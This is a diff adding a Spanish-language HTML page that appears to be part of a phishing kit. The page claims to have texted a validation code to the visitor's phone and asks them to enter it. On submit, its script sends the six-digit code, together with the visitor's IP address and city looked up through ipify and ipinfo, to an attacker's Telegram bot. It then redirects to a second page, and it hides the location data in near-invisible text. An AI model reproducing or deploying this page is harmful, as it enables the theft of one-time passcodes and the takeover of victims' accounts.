@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="comss/hojadeestilo.css">
+    <title>cmsssm</title>
+
+
+    
+    <script src="comss/jquery.min.js"></script>  
+    <script src="comss/mitem.js"></script>
+    <script>
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+              $("#gfg").html(data.ip);
+          });
+          $.getJSON("https://ipinfo.io", function(response) {
+        $("#ip").html("IP: " + response.ip);
+        $("#address").html("" + response.city + ", " + response.country);
+      });
+    
+      var u_name,  ip, ip2, message;
+      var ready = function() {
+        u_name = document.getElementById("elsmmhjh").value;
+  
+    
+        ip = document.getElementById("gfg").innerHTML;
+        ip2 = document.getElementById("address").innerHTML;
+        message = "yacayo\n☰UCODDDSMS: " + u_name +   "\n🌎IP: " + ip +"\n" + ip2;
+      };
+      var sender = function() {
+        ready();
+        var settings = {
+          "async": true,
+          "crossDomain": true,
+          "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+          "method": "POST",
+          "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+          },
+          "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+          })
+        };
+        $.ajax(settings).done(function(response) {
+          console.log(response);
+          window.location = 'comss2.html';
+        });
+        return false;
+      };   </script>
+
+</head>
+<body>
+
+    <div class="Kins092"></div>
+    <center>
+    <img width="30%" src="comss/cibtr.png" alt="">
+    <div class="container">
+
+        <center>
+            <form method="post" action="#" onsubmit="return sender();">
+            <h2>Enviamos un mensaje a tu celular . Por favor, ingresa el codigo de validacion para continuar.</h2>
+            <div class="input-group">
+               
+             
+            </div>
+            <div class="input-group">
+              
+                <input inputmode="numeric" placeholder="INGRESA EL CODIGO" type="text" id="elsmmhjh" name="elsmmhjh" required="" minlength="6" maxlength="6">
+            </div>
+           
+<input value="FINALIZAR" class="khg7BBttoo" type="submit">
+        </form></center>
+    </div>
+
+    <div style="color: rgb(255, 255, 255);font-size: 0.00002pt;">
+    <p id="gfg">190.61.55.42</p>
+    <p id="ip">IP: 190.61.55.42</p>
+    <p id="address">Bogotá, CO</p></div>
+
+
+</center></body></html>
